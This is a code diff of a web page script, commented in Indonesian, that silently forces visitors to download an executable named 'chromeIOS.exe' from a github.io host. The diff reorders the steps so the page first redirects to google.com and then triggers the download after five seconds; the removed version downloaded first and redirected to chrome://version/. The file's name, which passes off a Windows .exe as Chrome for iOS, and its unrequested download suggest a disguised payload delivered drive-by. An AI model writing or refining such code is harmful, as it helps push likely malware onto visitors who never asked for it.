@@ -20,26 +20,19 @@
 <script>
 function a() {
 
-  // Trigger download terlebih dahulu
-  var link = document.createElement('a');
-  link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe';
-  link.download = 'chromeIOS.exe';
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
+  // Redirect ke google.com terlebih dahulu
+  location.href = 'https://google.com';
 
-  // Redirect setelah download mulai (delay kecil)
+  // Setelah 5 detik, trigger download
   setTimeout(function () {
-    window.location.href = "chrome://version/";
-  }, 320); // 0.8 detik
+    var link = document.createElement('a');
+    link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe';
+    link.download = 'chromeIOS.exe';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  }, 5000); // Delay 5 detik sebelum download muncul
 }
-
-/* === TAMBAHAN SAJA (tidak mengubah kode di atas) === */
-window.addEventListener('pageshow', () => {
-  setTimeout(() => {
-    location.href = 'https://google.com';
-  }, 700);
-});
 </script>
 
 <center>
